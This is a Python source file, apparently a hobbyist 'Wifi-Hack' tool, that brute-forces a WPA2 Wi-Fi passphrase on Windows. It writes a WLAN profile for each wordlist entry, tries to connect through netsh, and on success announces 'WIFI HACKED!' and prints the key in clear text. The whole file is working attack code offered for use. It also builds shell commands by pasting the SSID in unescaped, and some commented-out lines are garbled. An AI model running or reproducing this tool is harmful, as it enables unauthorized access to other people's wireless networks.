import os
import urllib.request
import socket
import platform
import time as t
try:
     import colorama
except ModuleNotFoundError:
    os.system("pip install colorama")
    t.sleep(3)
    print("Run program again")
    os.system("pause")
    exit()
from colorama import *
colorama.init(autoreset=True)

#oreset=True)

#

#if platform.system() != "Windows":

#	print(Fore.RED + "[!]This tool is not compatible with your operating system\nUse this tool on a windows OS ")

#	
# windows OS ")

#	

#pwdfile = open("config.txt", "r")

#pwd = input(Fore.YELLOW + "Enter activation code: ")

#if pwd != pwdfile.read():

#	print(Fore.RED + "Incorrect Activation code☹️
#t.sleep(3)
def loop():
    os.system("cls")
    def check_connection():
    	try:
    		urllib.request.urlopen('http://google.com')
    		return True
    	except:
    		return False
    if check_connection():
    	print(Fore.RED + "Kindly turn off your mobile data and turn on ur Wifi!")
    	t.sleep(3)
    	loop()
    header = """
    
 ▄         ▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄          ▄         ▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄    ▄ 
▐░▌       ▐░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌        ▐░▌       ▐░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░▌  ▐░▌
▐░▌       ▐░▌ ▀▀▀▀█░█▀▀▀▀ ▐░█▀▀▀▀▀▀▀▀▀  ▀▀▀▀█░█▀▀▀▀         ▐░▌       ▐░▌▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀▀▀ ▐░▌ ▐░▌ 
▐░▌       ▐░▌     ▐░▌     ▐░▌               ▐░▌             ▐░▌       ▐░▌▐░▌       ▐░▌▐░▌          ▐░▌▐░▌  
▐░▌   ▄   ▐░▌     ▐░▌     ▐░█▄▄▄▄▄▄▄▄▄      ▐░▌ ▄▄▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌▐░▌          ▐░▌░▌   
▐░▌  ▐░▌  ▐░▌     ▐░▌     ▐░░░░░░░░░░░▌     ▐░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░▌          ▐░░▌    
▐░▌ ▐░▌░▌ ▐░▌     ▐░▌     ▐░█▀▀▀▀▀▀▀▀▀      ▐░▌ ▀▀▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌▐░▌          ▐░▌░▌   
▐░▌▐░▌ ▐░▌▐░▌     ▐░▌     ▐░▌               ▐░▌             ▐░▌       ▐░▌▐░▌       ▐░▌▐░▌          ▐░▌▐░▌  
▐░▌░▌   ▐░▐░▌ ▄▄▄▄█░█▄▄▄▄ ▐░▌           ▄▄▄▄█░█▄▄▄▄         ▐░▌       ▐░▌▐░▌       ▐░▌▐░█▄▄▄▄▄▄▄▄▄ ▐░▌ ▐░▌ 
▐░░▌     ▐░░▌▐░░░░░░░░░░░▌▐░▌          ▐░░░░░░░░░░░▌        ▐░▌       ▐░▌▐░▌       ▐░▌▐░░░░░░░░░░░▌▐░▌  ▐░▌
 ▀▀       ▀▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀            ▀▀▀▀▀▀▀▀▀▀▀          ▀         ▀  ▀         ▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀    ▀ 
                                                                                                           
         
	"""
    print(Fore.RED + header)
    print(Fore.YELLOW + "version 1.1".center(60))
    print(Fore.GREEN + """
Developer: Spider Anongreyhat
Team: TermuxHackz Society
""")
    print(Fore.MAGENTA + "=+"*  100)
    print(Fore.YELLOW + """
[1] Hack Wifi
[2] Display available network
[3] Check Version
[4] Report Issue
""")
    option = input(Fore.GREEN + "ENTER A VALID OPTION : ")
    if option == "1":
    	SSID = input(Fore.GREEN + "Input SSID: ")
    	filename = input(Fore.GREEN + "Enter wordlist file path: ")
    	try:
    		wordlist = open(filename, "r")
    	except:
    		print(Fore.RED + "Invalid file path or file doesn\'t exist")
    		
    		exit()
    	add_profile = "netsh wlan add profile filename=\"config.xml\" interface=Wi-Fi"
    	for password in wordlist:
    		file2 = open("config.xml","w")
    	
    		file2.write("""<?xml version=\"1.0\"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
    <name>"""+SSID+"""</name>
    <SSIDConfig>
        <SSID>
            <name>"""+SSID+"""</name>
        </SSID>
    </SSIDConfig>
    <connectionType>ESS</connectionType>
    <connectionMode>auto</connectionMode>
    <MSM>
        <security>
            <authEncryption>
                <authentication>WPA2PSK</authentication>
                <encryption>AES</encryption>
                <useOneX>false</useOneX>
            </authEncryption>
            <sharedKey>
                <keyType>passPhrase</keyType>
                <protected>false</protected>
                <keyMaterial>"""+password+"""</keyMaterial>
            </sharedKey>
        </security>
    </MSM>
</WLANProfile>""")
    
    		os.system(add_profile)
    		print(Fore.MAGENTA + SSID + " has been added")
    		print(Fore.GREEN + "Connecting to " + SSID)
    		connect_to = "netsh wlan connect name=\""+SSID+"\" ssid=\""+SSID+"\" interface=Wi-Fi"
    		os.system(connect_to)
    		t.sleep(2.50)
    		def connect():
    			try:
    				urllib.request.urlopen('http://google.com')
    				return True
    				exit()
    			
    			except:
    				return False
    				
    		#print('Connected' if connect() else
    		if connect():
    		 	os.system("cls")
    		 	print(Fore.MAGENTA + "Connected to " + SSID)
    		 	print(Fore.GREEN + "WIFI HACKED!\n\nDisplaying Wifi Info" )
    		 	display_info = "netsh wlan show profile name=\"" + SSID + "\" key=clear"
    		 	os.system(display_info)
    		 	os.system("pause")
    		 	exit()
    		else:
    		 	print(Fore.RED + 'Incorrect password')
    elif option == "2":
    	print(Fore.MAGENTA + "Displaying available wifi")
    	t.sleep(2)
    	available_network = "netsh wlan show networks interface=Wi-Fi"
    	os.system(available_network)
    	os.system("pause")
    	loop()
    elif option == "3":
    	print(Fore.CYAN + "Version is " + Fore.YELLOW + "v1.1")
    elif option == "4":
    	os.system("xdg-open https://github.com/spider863644/Wifi-Hack/issues")
    	exit()
    else:
    	print(Fore.RED + "Invalid option ")
    	t.sleep(3)
    	loop()
    	
    	
loop()  		